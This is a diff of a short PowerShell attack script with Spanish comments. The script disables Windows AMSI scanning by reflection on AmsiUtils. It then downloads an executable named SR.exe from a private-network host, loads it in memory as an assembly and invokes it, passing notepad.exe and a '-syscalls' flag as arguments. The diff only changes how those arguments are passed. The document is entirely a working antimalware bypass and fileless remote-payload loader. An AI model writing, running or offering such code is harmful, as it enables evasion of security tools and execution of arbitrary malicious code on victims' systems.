@@ -3,11 +3,17 @@ $a = [Ref].Assembly.GetTypes() | ? { $_.Name -like "*AmsiUtils" }
 $f = $a.GetFields('NonPublic,Static') | ? { $_.Name -like "*Context" }
 $f.SetValue($null, [IntPtr]::Zero)
 
-# Descarga SRPI desde tu server
+# Descarga SRPI
 $url = "http://10.0.2.15/SR.exe"
 $bytes = (New-Object Net.WebClient).DownloadData($url)
 
-# Carga y ejecuta SRPI con argumentos
+# Carga assembly
 $asm = [System.Reflection.Assembly]::Load($bytes)
-$args = [string[]]@("-file", "C:\Windows\System32\notepad.exe", "-syscalls")
-$asm.EntryPoint.Invoke($null, @(, $args))
+
+# Construye args de forma segura
+$srpiArgs = [string[]]@("-file", "C:\Windows\System32\notepad.exe", "-syscalls")
+$invokeParams = New-Object 'object[]' 1
+$invokeParams[0] = $srpiArgs
+
+# Invoca
+$asm.EntryPoint.Invoke($null, $invokeParams)
